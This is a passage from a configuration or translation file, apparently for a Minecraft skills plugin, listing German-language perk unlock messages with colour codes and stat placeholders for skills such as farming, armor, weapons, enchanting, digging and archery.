          ""&c{alchemy_alchemyexpmultiplier_add} &7Alchemie EXP"",
          ""&d{alchemy_genericbrewingskill_add} &7&lPermanent &7Braufertigkeit"",
          ""&d{alchemy_brewingtimereduction_add} &7&lPermanent &7Braugeschwindigkeit""
        ],
        ""enchanting_perk_ng1_messages"": [
          ""&b✰ &9Neues Spiel I &b✰"",
          ""&c{enchanting_enchantingexpmultiplier_add} &7Verzauberung EXP"",
          ""&b{enchanting_enchantingskill_add} &7&lPermanent &7Verzauberungsfähigkeit"",
          ""&b{enchanting_essencemultiplier_add} &7&lPermanent &7Erfahrungspunkte""
        ],
        ""enchanting_perk_ng2_messages"": [
          ""&b✰ &9Neues Spiel II &b✰"",
          ""&c{enchanting_enchantingexpmultiplier_add} &7Verzauberung EXP"",
          ""&b{enchanting_enchantingskill_add} &7&lPermanent &7Verzauberungsfähigkeit"",
          ""&b{enchanting_essencemultiplier_add} &7&lPermanent &7Erfahrungspunkte""
        ],
        ""smithing_perk_ng1_messages"": [
          ""&e✰ &6Neues Spiel I &e✰"",
          ""&c{smithing_genericexpmultiplier_add} &7Schmieden EXP"",
          ""&e{smithing_genericcraftingskill_add} &7&lPermanent &7Schmiedenkunst""
        ],
        ""smithing_perk_ng2_messages"": [
          ""&e✰ &6Neues Spiel II &e✰"",
          ""&c{smithing_genericexpmultiplier_add} &7Schmieden EXP"",
          ""&e{smithing_genericcraftingskill_add} &7&lPermanent &7Schmiedenkunst""
        ],
        ""power_perk_1a_messages"": [
          ""&c✰ &4Vitalität I &c✰"",
          ""&c{power_healthbonus_add} &7Maximale Gesundheit""
        ],
        ""power_perk_2a_messages"": [
          ""&c✰ &4Vitalität II &c✰"",
          ""&c{power_healthbonus_add} &7Maximale Gesundheit""
        ],
        ""power_perk_3a_messages"": [
          ""&c✰ &4Vitalität III &c✰"",
          ""&c{power_healthbonus_add} &7Maximale Gesundheit""
        ],
        ""power_perk_1b_messages"": [
          ""&f✰ &7Eiserne Haut I &f✰"",
          ""&f{power_armorbonus_add} &7Natürliche Rüstung""
        ],
        ""power_perk_2b_messages"": [
          ""&f✰ &7Eiserne Haut II &f✰"",
          ""&f{power_armorbonus_add} &7Natürliche Rüstung""
        ],
        ""power_perk_3b_messages"": [
          ""&f✰ &7Eiserne Haut III &f✰"",
          ""&f{power_armorbonus_add} &7Natürliche Rüstung""
        ],
        ""power_perk_1c_messages"": [
          ""&a✰ &2Göttliche Gunst I &a✰"",
          ""&a{power_luckbonus_add} &7Glück""
        ],
        ""power_perk_2c_messages"": [
          ""&a✰ &2Göttliche Gunst II &a✰"",
          ""&a{power_luckbonus_add} &7Glück""
        ],
        ""power_perk_3c_messages"": [
          ""&a✰ &2Göttliche Gunst III &a✰"",
          ""&a{power_luckbonus_add} &7Glück""
        ],
        ""power_perk_1d_messages"": [
          ""&d✰ &5Regeneration I &d✰"",
          ""&d{power_healthregenerationbonus_add} &7Gesundheitsregeneration""
        ],
        ""power_perk_2d_messages"": [
          ""&d✰ &5Regeneration II &d✰"",
          ""&d{power_healthregenerationbonus_add} &7Gesundheitsregeneration""
        ],
        ""power_perk_3d_messages"": [
          ""&d✰ &5Regeneration III &d✰"",
          ""&d{power_healthregenerationbonus_add} &7Gesundheitsregeneration""
        ],
        ""power_perk_1e_messages"": [
          ""&e✰ &6Physis I &e✰"",
          ""&e{power_attackdamagemultiplier_add} &7Verursachter Schaden""
        ],
        ""power_perk_2e_messages"": [
          ""&e✰ &6Physis II &e✰"",
          ""&e{power_attackdamagemultiplier_add} &7Verursachter Schaden""
        ],
        ""power_perk_3e_messages"": [
          ""&e✰ &6Physis III &e✰"",
          ""&e{power_attackdamagemultiplier_add} &7Verursachter Schaden""
        ],
        ""power_perk_1f_messages"": [
          ""&e✰ &6Plünderer I &e✰"",
          ""&e{power_entitydropmultiplier_add} &7Monsterdropp""
        ],
        ""power_perk_2f_messages"": [
          ""&e✰ &6Plünderer II &e✰"",
          ""&e{power_entitydropmultiplier_add} &7Monsterdropp""
        ],
        ""power_perk_3f_messages"": [
          ""&e✰ &6Plünderer III &e✰"",
          ""&e{power_entitydropmultiplier_add} &7Monsterdropp""
        ],
        ""power_perk_1g_messages"": [
          ""&b✰ &9Ehrgeiz I &b✰"",
          ""&b{power_cooldownreduction_add} &7Abklingzeitverkürzung""
        ],
        ""power_perk_2g_messages"": [
          ""&b✰ &9Ehrgeiz II &b✰"",
          ""&b{power_cooldownreduction_add} &7Abklingzeitverkürzung""
        ],
        ""power_perk_3g_messages"": [
          ""&b✰ &9Ehrgeiz III &b✰"",
          ""&b{power_cooldownreduction_add} &7Abklingzeitverkürzung""
        ],
        ""fishing_perk_1_messages"": [
          ""&b✰ &9Glücklicher Fischer &b✰"",
          ""&b{fishing_fishingluck_add} &7Angelglück""
        ],
        ""fishing_perk_2_messages"": [
          ""&b✰ &9Leidenschaft für die Meere &b✰"",
          ""&b{fishing_fishingessencemultiplier_add} &7Angel-Erfahrungspunkte""
        ],
        ""fishing_perk_3_messages"": [
          ""&b✰ &9Tiefensinne &b✰"",
          ""&b{fishing_fishingspeedbonus_add} &7Ködergeschwindigkeit"",
          ""&b{fishing_fishingluck_add} &7Angelglück""
        ],
        ""fishing_perk_4_messages"": [
          ""&b✰ &9Doppelhaken &b✰"",
          ""&b{fishing_fishingdrops_add} &7Doppelfang-Chance""
        ],
        ""fishing_perk_5_messages"": [
          ""&b✰ &9Goldköder &b✰"",
          ""&b{fishing_fishingspeedbonus_add} &7Ködergeschwindigkeit"",
          ""&b{fishing_fishingluck_add} &7Angelglück""
        ],
        ""fishing_perk_6_messages"": [
          ""&b✰ &9Mystischer Köder &b✰"",
          ""&b{fishing_fishingdrops_add} &7Doppelfang-Chance"",
          ""&b{fishing_fishingessencemultiplier_add} &7Angel-Erfahrungspunkte""
        ],
        ""fishing_perk_combo_messages"": [
          ""&b✰ &9Tiefseeplünderei &b✰"",
          ""&bRezepte freigeschaltet"",
          ""&7- Alle Demontage-Rezepte"",
          ""&8Um einen Gegenstand zu demontieren, platziere ihn in ein Crafting-Raster"",
          ""&cVanilla-Gegenstände können nicht demontiert werden""
        ],
        ""farming_perk_1_messages"": [
          ""&a✰ &2Sanfte Berührung &a✰"",
          ""&aRechtklick auf Feldfrüchte erntet und pflanzt sie nun""
        ],
        ""farming_perk_2_messages"": [
          ""&a✰ &2Magischer Boden &a✰"",
          ""&a{farming_farmingdrops_add} &7Farming-Dropp"",
          ""&a{farming_farmingexperiencerate_add} &7Erfahrungspunkte-Dropp""
        ],
        ""farming_perk_3_messages"": [
          ""&a✰ &2Gesegnete Ernte &a✰"",
          ""&a{farming_instantgrowthrate_add} &7Wachstumsrate"",
          ""&a{farming_farmingexperiencerate_add} &7Erfahrungspunkte-Dropp""
        ],
        ""farming_perk_4_messages"": [
          ""&a✰ &2Göttliche Ernte &a✰"",
          ""&a{farming_instantgrowthrate_add} &7Wachstumsrate"",
          ""&a{farming_farmingexperiencerate_add} &7Erfahrungspunkte-Dropp""
        ],
        ""farming_perk_5_messages"": [
          ""&a✰ &2Automatisierte Landwirtschaft &a✰"",
          ""&a+Field Harvest"",
          ""&7- 5s Abklingzeit"",
          ""&7- Erntet sofort alle Feldfrüchte"",
          ""&7- Erntet bis zu 256 Feldfrüchte auf einmal"",
          ""&8Aktiviert durch Umschalten-Rechtsklick auf eine Feldfrucht""
        ],
        ""farming_perk_1a_messages"": [
          ""&a✰ &2Tierhaltung &a✰"",
          ""&a{farming_growuptimemultiplier_add} &7Tier-Wachstumsgeschwindigkeit"",
          ""&a{farming_butcherydrops_add} &7Tier-Dropp"",
          ""&a{farming_breedingexperiencemultiplier_add} &7Zucht-Erfahrungspunkte""
        ],
        ""farming_perk_2a_messages"": [
          ""&a✰ &2Häuten &a✰"",
          ""&a{farming_growuptimemultiplier_add} &7Tier-Wachstumsgeschwindigkeit"",
          ""&a{farming_butcherydrops_add} &7Tier-Dropp"",
          ""&a{farming_breedingexperiencemultiplier_add} &7Zucht-Erfahrungspunkte"",
          ""&a+4x Schaden an Tieren""
        ],
        ""farming_perk_1b_messages"": [
          ""&a✰ &2Imkerei &a✰"",
          ""&a{farming_hivehoneysavechance_add} &7Bienenstockauffüllchance"",
          ""&a+Bienen-Aggressions-Immunität""
        ],
        ""farming_perk_1c_messages"": [
          ""&a✰ &2Unverträgliche Ernährung &a✰"",
          ""&a+3x Verfallener Lebensmittel-Wert"",
          ""&a+Verfallene Lebensmittel-Immunität"",
          ""&c{power_foodbonusvegetable_add} &7Lebensmittel-Wert"",
          ""&7Du kannst \""Ausgewogene Ernährung\"" nicht mehr auswählen"",
          ""&8\""Ich bin der Müllmann! Ich komme raus, werfe Müll überall im Ring herum! Und dann fange ich an, Müll zu essen!\""""
        ],
        ""farming_perk_2c_messages"": [
          ""&a✰ &2Ausgewogene Ernährung &a✰"",
          ""&a{power_foodbonusvegetable_add} &7Lebensmittel-Wert"",
          ""&7Du kannst \""Unverträgliche Ernährung\"" nicht mehr auswählen""
        ],
        ""heavyarmor_perk_1_messages"": [
          ""&c✰ &4Gestärkte Passform &c✰"",
          ""&c{heavyarmor_heavyarmormultiplier_add} &7Schwere Rüstung""
        ],
        ""heavyarmor_perk_1a_messages"": [
          ""&c✰ &4Skippe nie den Leg Day &c✰"",
          ""&cVerringertes Schwere Rüstung Belasten""
        ],
        ""heavyarmor_perk_2a_messages"": [
          ""&c✰ &4Innovative Infanterie &c✰"",
          ""&c-1 &7Teile für vollen Satz-Bonus erforderlich"",
          ""&cVerringertes Schwere Rüstung Belasten""
        ],
        ""heavyarmor_perk_1b_messages"": [
          ""&c✰ &4Lebensstahl &c✰"",
          ""&c{heavyarmor_heavyarmormultiplier_add} &7Schwere Rüstung"",
          ""&c+Satz-Bonus"",
          ""&7- &c{heavyarmor_sethealingbonus_add}&7 Heilung""
        ],
        ""heavyarmor_perk_2b_messages"": [
          ""&c✰ &4Dornenpanzer &c✰"",
          ""&c{heavyarmor_heavyarmormultiplier_add} &7Schwere Rüstung"",
          ""&c+Satz-Bonus"",
          ""&7- &c{heavyarmor_setreflectchance_add}&7 Chance für &c{heavyarmor_setreflectfraction_add}&7 Schaden-Reflektion""
        ],
        ""heavyarmor_perk_2_messages"": [
          ""&c✰ &4Juggernaut &c✰"",
          ""&c+Satz-Boni"",
          ""&7- &c{heavyarmor_setknockbackresistance_add}&7 Rückstoß-Resistenz"",
          ""&7- &cTränke-Effekt-Immunitäten &7gegen &cLangsamkeit&7, &cSchwäche&7 und &cLevitation""
        ],
        ""heavyarmor_perk_1c_messages"": [
          ""&c✰ &4Zorn &c✰"",
          ""&c+Zorn"",
          ""&7- Aktiviert bei 30% LP"",
          ""&7- 10m Abklingzeit"",
          ""&7- Gewährt Stärke I, Eile I und Absorption I für 10 Sekunden""
        ],
        ""heavyarmor_perk_2c_messages"": [
          ""&c✰ &4Wut &c✰"",
          ""&cZorn"",
          ""&7- Aktiviert bei 50% LP"",
          ""&7- 5m Abklingzeit"",
          ""&7- Gewährt Stärke III, Eile III, Absorption III und Widerstand I für 20 Sekunden""
        ],
        ""heavyarmor_perk_combo_messages"": [
          ""&c✰ &4Kenne deine Schwächen &c✰"",
          ""&c+Satz-Boni"",
          ""&7- &c{heavyarmor_setcritchanceresistance_add}&7 Krit-Resistenz"",
          ""&7- &c{heavyarmor_setimmunityfractionbonus_add}&7 Immunität""
        ],
        ""lightarmor_perk_1_messages"": [
          ""&e✰ &6Eiserne Nieten &e✰"",
          ""&e{lightarmor_lightarmormultiplier_add} &7Leichte Rüstung""
        ],
        ""lightarmor_perk_1a_messages"": [
          ""&e✰ &6Unbelastet &e✰"",
          ""&eVerringertes Leichte Rüstung Belasten""
        ],
        ""lightarmor_perk_2a_messages"": [
          ""&e✰ &6Resourceful Scout &e✰"",
          ""&e-1 &7Teile für vollen Satz-Bonus erforderlich"", 
          ""&eKein Leichte Rüstung Belasten""
        ],
        ""lightarmor_perk_1b_messages"": [
          ""&e✰ &6Kontrollierter Stoffwechsel &e✰"",
          ""&e{lightarmor_lightarmormultiplier_add} &7Leichte Rüstung"",
          ""&e+Satz-Bonus"",
          ""&7- &e{lightarmor_sethungersavechance_add}&7 Verringerter Hungerverbrauch""
        ],
        ""lightarmor_perk_2b_messages"": [
          ""&e✰ &6Reflexe &e✰"",
          ""&e{lightarmor_lightarmormultiplier_add} &7Leichte Rüstung"",
          ""&e+Satz-Bonus"",
          ""&7- &e{lightarmor_setdodgechance_add}&7 Ausweich-Chance"",
          ""&8Ausweichen eines Angriffs verhindert den Schaden vollständig. Du musst dem Angreifer zugewandt sein, um Angriffe ausweichen zu können""
        ],
        ""lightarmor_perk_2_messages"": [
          ""&e✰ &6Drachen-Schuppen &e✰"",
          ""&e+Satz-Boni"",
          ""&7- &e{lightarmor_setmagicresistance_add}&7 Magie-Schadenswiderstand"",
          ""&7- &eTränke-Effekt-Immunitäten &7gegen &eGift&7, &eBlindheit&7 und &eHunger""
        ],
        ""lightarmor_perk_1c_messages"": [
          ""&e✰ &6Adrenalin &e✰"",
          ""&e+Adrenalin"",
          ""&7- Aktiviert bei 30% LP"",
          ""&7- 10m Abklingzeit"",
          ""&7- Gewährt Schnelligkeit I, Sprungkraft I und Regeneration I für 10 Sekunden""
        ],
        ""lightarmor_perk_2c_messages"": [
          ""&e✰ &6Blitz &e✰"",
          ""&eAdrenalin"",
          ""&7- Aktiviert bei 50% LP"",
          ""&7- 5m Abklingzeit"",
          ""&7- Gewährt Schnelligkeit III, Sprungkraft III, Regeneration III und Widerstand I für 20 Sekunden""
        ],
        ""lightarmor_perk_combo_messages"": [
          ""&e✰ &6Perfekte Haltung &e✰"",
          ""&e+Satz-Boni"",
          ""&7- &e{lightarmor_setcritchanceresistance_add}&7 Krit-Resistenz"",
          ""&7- &eStun-Immunität""
        ],
        ""heavyweapons_perk_1_messages"": [
          ""&c✰ &4Wild &c✰"",
          ""&c{heavyweapons_damagemultiplier_add} &7Schwere Waffen Schaden""
        ],
        ""heavyweapons_perk_2_messages"": [
          ""&c✰ &4Brutalos &c✰"",
          ""&c{heavyweapons_powerattackdamagemultiplier_add} &7Kraftangriff-Schaden"",
          ""&8Kraftangriffe sind Nahkampfangriffe im Fallen, was Vanilla Minecraft als 'Kritischer Treffer' betrachtet"",
          ""&c{heavyweapons_critchance_add} &7Krit-Chance""
        ],
        ""heavyweapons_perk_3_messages"": [
          ""&c✰ &4Barbar &c✰"",
          ""&c{heavyweapons_damagemultiplier_add} &7Schwere Waffen Schaden"",
          ""&cKraftangriffe"",
          ""&7- Verursachen nun &c{heavyweapons_powerattackfraction_add}&7 Schaden an allen Feinden in einem &c{heavyweapons_powerattackradius_add}&7-Block-Radius""
        ],
        ""heavyweapons_perk_4_messages"": [
          ""&c✰ &4Viking &c✰"",
          ""&c{heavyweapons_powerattackdamagemultiplier_add} &7Kraftangriff-Schaden"",
          ""&c{heavyweapons_penetrationflat_add} &7Rüstungsdurchdringung"",
          ""&8Rüstungsdurchdringung reduziert den Rüstungswert deiner angegriffenen Ziele, was den Schaden gegen sie erhöht."",
          ""&8Ziele ohne Rüstung nehmen immer noch etwas zusätzlichen Schaden""
        ],
        ""heavyweapons_perk_5_messages"": [
          ""&c✰ &4Berserker &c✰"",
          ""&c{heavyweapons_damagemultiplier_add} &7Schwere Waffen Schaden"",
          ""&c{heavyweapons_penetrationflat_add} &7Rüstungsdurchdringung"",
          ""&cKraftangriffe"",
          ""&7- Verursachen nun &c75%&7 Schaden an allen Feinden in einem &c2&7-Block-Radius""
        ],
        ""heavyweapons_perk_6_messages"": [
          ""&c✰ &4Todeskünder &c✰"",
          ""&c{heavyweapons_critchance_add} &7Krit-Chance"",
          ""&c{heavyweapons_critdamage_add} &7Krit-Schaden"",
          ""&c+Krits verursachen Blutungen"",
          ""&c{heavyweapons_bleeddamage_add} &7Blutungen-Schaden""
        ],
        ""heavyweapons_perk_a1_messages"": [
          ""&c✰ &4Waffenbeschichtung &c✰"",
          ""&c+Waffenbeschichtung"",
          ""&7- 2 Ladungen"",
          ""&7- 20% Dauer"",
          ""&7- 75% Verstärkung"",
          ""&8Nimm einen Trank und rechtsklicke ihn"",
          ""&8auf eine schwere Waffe in deinem"",
          ""&8Inventar, um ihn anzuwenden.""
        ],
        ""heavyweapons_perk_a2_messages"": [
          ""&c✰ &4Toxischer Stahl &c✰"",
          ""&cWaffenbeschichtung"",
          ""&7- 4 Ladungen"",
          ""&7- 30% Dauer"",
          ""&7- 100% Verstärkung""
        ],
        ""heavyweapons_perk_combo_messages"": [
          ""&c✰ &4Zerschmetternde Schläge &c✰"",
          ""&c{heavyweapons_penetrationfraction_add} &7Rüstungsdurchdringung"",
          ""&c{heavyweapons_stunchance_add} &7Betäubungs-Chance"",
          ""&c{heavyweapons_damagetolightarmormultiplier_add} &7Leichte Rüstung Schaden"",
          ""&8Leichte Rüstung Schaden ist zusätzlicher Schaden, der für jedes Teil leichter Rüstung, das das Ziel trägt, verursacht wird""
        ],
        ""lightweapons_perk_1_messages"": [
          ""&e✰ &6Söldner &e✰"",
          ""&e{lightweapons_damagemultiplier_add} &7Leichte Waffen Schaden""
        ],
        ""lightweapons_perk_2_messages"": [
          ""&e✰ &6Knappe &e✰"",
          ""&e{lightweapons_attackspeedmultiplier_add} &7Angriffsgeschwindigkeit"",
          ""&e{lightweapons_critchance_add} &7Krit-Chance""
        ],
        ""lightweapons_perk_3_messages"": [
          ""&e✰ &6Ritter &e✰"",
          ""&e{lightweapons_damagemultiplier_add} &7Leichte Waffen Schaden"",
          ""&eParieren"",
          ""&7- 0,35s Dauer"",
          ""&7- 5s Abklingzeit"",
          ""&7- 50% Abklingzeit verringert bei Erfolg"",
          ""&7- 75% Schaden reduziert"",
          ""&8Aktiviert durch Rechtsklick mit einer leichten Waffe in der Hand."",
          ""&8Nachdem du eine Parade aktiviert hast, reduziert ein Treffer vor Ablauf der Dauer den erlittenen Schaden und schwächt den Angreifer stark.""
        ],
        ""lightweapons_perk_4_messages"": [
          ""&e✰ &6Paladin &e✰"",
          ""&e{lightweapons_attackspeedmultiplier_add} &7Angriffsgeschwindigkeit"",
          ""&e{lightweapons_immunityreductionfraction_add} &7Immunitätsreduktion""
        ],
        ""lightweapons_perk_5_messages"": [
          ""&e✰ &6Templer &e✰"",
          ""&e{lightweapons_damagemultiplier_add} &7Leichte Waffen Schaden"",
          ""&e{lightweapons_immunityreductionfraction_add} &7Immunitätsreduktion"",
          ""&eParieren"",
          ""&7- 0,7s Dauer"",
          ""&7- 2s Abklingzeit"",
          ""&7- Keine Abklingzeit bei Erfolg"",
          ""&7- 100% Schaden reduziert""
        ],
        ""lightweapons_perk_6_messages"": [
          ""&e✰ &6Feldherr &e✰"",
          ""&e{lightweapons_critchance_add} &7Krit-Chance"",
          ""&e{lightweapons_critdamage_add} &7Krit-Schaden"",
          ""&e+Krits verursachen Blutungen"",
          ""&e{lightweapons_bleeddamage_add} &7Blutungen-Schaden""
        ],
        ""lightweapons_perk_a1_messages"": [
          ""&e✰ &6Waffenbeschichtung &e✰"",
          ""&e+Waffenbeschichtung"",
          ""&7- 3 Ladungen"",
          ""&7- 20% Dauer"",
          ""&7- 50% Verstärkung"",
          ""&8Nimm einen Trank und rechtsklicke ihn"",
          ""&8auf eine leichte Waffe in deinem"",
          ""&8Inventar, um ihn anzuwenden.""
        ],
        ""lightweapons_perk_a2_messages"": [
          ""&e✰ &6Biowaffe &e✰"",
          ""&eWaffenbeschichtung"",
          ""&7- 7 Ladungen"",
          ""&7- 30% Dauer"",
          ""&7- 75% Verstärkung""
        ],
        ""lightweapons_perk_combo_messages"": [
          ""&e✰ &6Titan &e✰"",
          ""&e{lightweapons_penetrationflat_add} &7Rüstungsdurchdringung"",
          ""&e{lightweapons_knockbackmultiplier_add} &7Rückstoß"",
          ""&e{lightweapons_attackreachbonus_add} &7Angriffsreichweite""
        ],
        ""enchanting_perk_1_messages"": [
          ""&b✰ &9Runischer Fokus &b✰"",
          ""&b{enchanting_enchantingskill_add} &7Verzauberungs-Kraft""
        ],
        ""enchanting_perk_a1_messages"": [
          ""&b✰ &9Stabiler Kondensator &b✰"",
          ""&b{enchanting_essencerefundfraction_add} &7Erfahrungs punkte Rückerstattung"",
          ""&b{enchanting_lapissavechance_add} &7Reduzierter Lapislazuli-Verbrauch""
        ],
        ""enchanting_perk_a2_messages"": [
          ""&b✰ &9Reiner Kondensator &b✰"",
          ""&b{enchanting_enchantingskill_add} &7Verzauberungs-Kraft"",
          ""&b{enchanting_essencerefundfraction_add} &7Erfahrungspunkte Rückerstattung"",
          ""&b{enchanting_lapissavechance_add} &7Reduzierter Lapislazuli-Verbrauch""
        ],
        ""enchanting_perk_b1_messages"": [
          ""&b✰ &9Mentaler Fokus &b✰"",
          ""&b{enchanting_essencemultiplier_add} &7Erfahrungspunkte"",
          ""&b{power_allskillexpmultiplier_add} &7Fertigkeits-EXP""
        ],
        ""enchanting_perk_b2_messages"": [
          ""&b✰ &9Hexklinge &b✰"",
          ""&b{enchanting_essencemultiplier_add} &7Erfahrungspunkte"",
          ""&b{power_allskillexpmultiplier_add} &7Fertigkeits-EXP"",
          ""&b+Hexklinge"",
          ""&7- Wandelt &b{enchanting_activeelementaldamageconversion_add}&7 deines Schadens in &b60%&7 Elementarschaden um"",
          ""&7- Jeder Treffer kostet &b{enchanting_essencecostperhit_add}&7 Erfahrungspunkte"",
          ""&7- Kann frei zwischen Heilig und Unheilig wählen"",
          ""&8Die elementare Klinge wird durch Betätigung der \""Waffe wechseln\""-Taste (Standard F) umgeschaltet""
        ],
        ""enchanting_perk_radiant_messages"": [
          ""&b✰ &9Hexklinge: &e&lHeilig &b✰"",
          ""&7Hexklinge verursacht nun &e&lHeiligen &7Schaden"",
          ""&7- Sehr effektiv gegen Untote"",
          ""&7- Effektiv gegen Nether-Mobs"",
          ""&7- Wirkungslos gegen alles andere""
        ],
        ""enchanting_perk_necrotic_messages"": [
          ""&b✰ &9Hexklinge: &8&lUnheilig &b✰"",
          ""&7Hexklinge verursacht nun &8&lUnheiligen &7Schaden"",
          ""&7- Effektiv gegen alles"",
          ""&7- Schwach gegen Nether-Mobs"",
          ""&7- Wirkungslos gegen Untote""
        ],
        ""enchanting_perk_2_messages"": [
          ""&b✰ &9Arkane Standfestigkeit &b✰"",
          ""&b{enchanting_enchantingskill_add} &7Verzauberungs-Kraft"",
          ""&b{enchanting_essencerefundfraction_add} &7Erfahrungspunkte Rückerstattung"",
          ""&7Wähle zwischen Schadens- oder Schutzenzaubereinen"",
          ""&7um sie um &b+1 Stufen&7 zu verstärken. &cWahl ist endgültig""
        ],
        ""enchanting_perk_sharpnesses_messages"": [
          ""&b✰ &9Arkane Standfestigkeit: Schaden &b✰"",
          ""&b+1 Stufe &7für &bSchärfe&7, &bSchmettern&7, &bVernichter der Gliederfüßer&7,"",
          ""&bDurchbohren&7 und &bKraft""
        ],
        ""enchanting_perk_protections_messages"": [
          ""&b✰ &9Arkane Standfestigkeit: Schutz &b✰"",
          ""&b+1 Stufe &7für &bFeuer&7, &bExplosion&7, &bProjektil&7,"",
          ""&7und regulären &bSchutz&7 sowie &bFederfall""
        ],
        ""enchanting_perk_3_messages"": [
          ""&b✰ &9Erzmagier &b✰"",
          ""&b{enchanting_enchantingskill_add} &7Verzauberungs-Kraft"",
          ""&7Wähle zwischen Unzerbrechlichkeit oder Plünderung,"",
          ""&7um sie um &b+2 Stufen&7 zu verstärken, oder Glück um &b+1 Stufe&7."",
          ""&cWahl ist endgültig""
        ],
        ""enchanting_perk_fortune_messages"": [
          ""&b✰ &9Erzmagier: Glück &b✰"",
          ""&b+1 Stufe &7für &bGlück""
        ],
        ""enchanting_perk_looting_messages"": [
          ""&b✰ &9Erzmagier: Plünderung &b✰"",
          ""&b+2 Stufen &7für &bPlünderung""
        ],
        ""enchanting_perk_unbreaking_messages"": [
          ""&b✰ &9Erzmagier: Unzerbrechlichkeit &b✰"",
          ""&b+2 Stufen &7für &bUnzerbrechlichkeit""
        ],
        ""enchanting_perk_4_messages"": [
          ""&b✰ &9Göttlicher Nexus &b✰"",
          ""&b{enchanting_enchantingskill_add} &7Verzauberungs-Kraft"",
          ""&7Wähle zwischen allen offensiven, defensiven oder nützlichen"",
          ""&7Verzauberungen, um sie um &b+1 Stufen&7 zu verstärken."",
          ""&cWahl ist endgültig""
        ],
        ""enchanting_perk_offensive_messages"": [
          ""&b✰ &9Göttlicher Nexus: Beschwörung &b✰"",
          ""&b+1 Stufe &7für &ball offensiven Verzauberungen""
        ],
        ""enchanting_perk_defensive_messages"": [
          ""&b✰ &9Göttlicher Nexus: Bannzauber &b✰"",
          ""&b+1 Stufen &7für &ball defensiven Verzauberungen""
        ],
        ""enchanting_perk_utility_messages"": [
          ""&b✰ &9Göttlicher Nexus: Wahrsagerei &b✰"",
          ""&b+1 Stufen &7für &ball nützlichen Verzauberungen""
        ],
        ""enchanting_perk_combo_messages"": [
          ""&b✰ &9Habichtglück &b✰"",
          ""&b{power_luckbonus_add} &7Glück""
        ],
        ""digging_perk_1_messages"": [
          ""&a✰ &2Gräber &a✰"",
          ""&a{digging_diggingspeedbonus_add} &7Grabungsgeschwindigkeit""
        ],
        ""digging_perk_2_messages"": [
          ""&a✰ &2Filterer &a✰"",
          ""&a+Tier 1 Grabungsschätze"",
          ""&7- Knochen, Fäden, Stöcke, Kohle, Schießpulver, usw.""
        ],
        ""digging_perk_3_messages"": [
          ""&a✰ &2Grundreplikation &a✰"",
          ""&aRezepte Freigeschaltet"",
          ""&7- Mycelium"",
          ""&7- Podzol"",
          ""&7- Schlamm"",
          ""&7- Ton"",
          ""&7- Gras"",
          ""&7- Flint"",
          ""&7- Seelensand"",
          ""&7- Seelenerde""
        ],
        ""digging_perk_a1_messages"": [
          ""&a✰ &2Archäologe &a✰"",
          ""&a{digging_archaeologyrepeatchance_add} &7Wiederholungschance beim Bürsten"",
          ""&a{digging_archaeologyluck_add} &7Archäologie-Glück""
        ],
        ""digging_perk_a2_messages"": [
          ""&a✰ &2Antike &a✰"",
          ""&a{digging_archaeologyrepeatchance_add} &7Wiederholungschance beim Bürsten"",
          ""&aRare Chance, neue verdächtige Blöcke beim Graben zu finden."",
          ""&aChance erhöht sich stark in der Nähe von Strukturen.""
        ],
        ""digging_perk_b1_messages"": [
          ""&a✰ &2Ausgräber &a✰"",
          ""&a{digging_diggingspeedbonus_add} &7Grabungsgeschwindigkeit""
        ],
        ""digging_perk_b2_messages"": [
          ""&a✰ &2Umgraben &a✰"",
          ""&a+Tier 2 Grabungsschätze"",
          ""&7- Rohes Gold, Rohes Eisen, Rohes Kupfer, Enderperlen, Amethyst, usw.""
        ],
        ""digging_perk_4_messages"": [
          ""&a✰ &2Versteckter Schatz &a✰"",
          ""&a+Tier 3 Grabungsschätze"",
          ""&7- Diamanten, Smaragde, Echo-Scherben, Verzauberte Bücher, Uraltes Material, usw.""
        ],
        ""digging_perk_combo_messages"": [
          ""&a✰ &2Flexibler Baumeister &a✰"",
          ""&aInteraktionen Freigeschaltet"",
          ""&a- Spitzhacken (Rechtsklick)"",
          ""&7    Beschädigt Stein-Blöcke und Ziegel"",
          ""&7    zu einer raueren Variante. Zum Beispiel"",
          ""&8    Ziegel > Rissige Ziegel"",
          ""&8    Stein > Cobblestone"",
          ""&8    Cobblestone > Kies"",
          ""&8    Polierte Blöcke > Unpolierte Blöcke"",
          ""&a- Blaues Pulver (Rechtsklick)"",
          ""&7    Schmilzt bestimmte Blöcke oder fusioniert sie"",
          ""&7    mit Lava. Zum Beispiel"",
          ""&8    Netherrack > Magma"",
          ""&8    Rohmetallblöcke > Metallblöcke"",
          ""&8    Sand > Glas"",
          ""&8    Ton > Terrakotta"",
          ""&a- Samen oder Kelp (Rechtsklick)"",
          ""&7    Fügt bestimmten Blöcken Vegetation hinzu."",
          ""&7    Zum Beispiel"",
          ""&8    Cobblestone > Moosiger Cobblestone"",
          ""&8    Stein > Moos"",
          ""&8    Steinziegel > Moosige Steinziegel"",
          ""&8    Erde > Gras""
        ],
        ""archery_perk_1_messages"": [
          ""&e✰ &6Ranger &e✰"",
          ""&e{archery_bowdamagemultiplier_add} &7Fernkampfschaden"",
          ""&e+1 Genauigkeit""
        ],
        ""archery_perk_2_messages"": [
          ""&e✰ &6Resourceful Hunter &e✰"",
          ""&e-{archery_ammosavechance_add} &7Munitionsverbrauch"",
          ""&eRezept Freigeschaltet"",
          ""&7- &eSteinpfeile""
        ],
        ""archery_perk_3_messages"": [
          ""&e✰ &6Bogenschütze &e✰"",
          ""&e{archery_bowcritchance_add} &7Krit-Chance"",
          ""&e+1.5 Genauigkeit"",
          ""&eRezepte Freigeschaltet"",
          ""&7- &eKupferpfeile"",
          ""&7- &eGoldpfeile""
        ],
        ""archery_perk_4_messages"": [
          ""&e✰ &6Fernkampf-Infanterie &e✰"",
          ""&e{archery_bowdamagemultiplier_add} &7Fernkampfschaden"",
          ""&e{archery_distancedamagebonus_add} &7Schaden/10 Blöcke Entfernung"", 
          ""&e-{archery_ammosavechance_add} &7Munitionsverbrauch"",
          ""&eRezepte Freigeschaltet"",
          ""&7- &eEisenpfeile"",
          ""&7- &eEnderische Pfeile""
        ],
        ""archery_perk_5_messages"": [
          ""&e✰ &6Scharfschütze &e✰"",
          ""&e{archery_bowcritchance_add} &7Krit-Chance"",
          ""&e{archery_critdamage_add} &7Krit-Schaden"",
          ""&e+2.5 Genauigkeit"",
          ""&eRezept Freigeschaltet"",
          ""&7- &eDiamantpfeile""
        ],
        ""archery_perk_6_messages"": [
          ""&e✰ &6Necrotic-Schüsse &e✰"",
          ""&e{archery_distancedamagebonus_add} &7Schaden/10 Blöcke Entfernung"",
          ""&e-Unendlichkeit Schadensstrafenbeseitigung"",
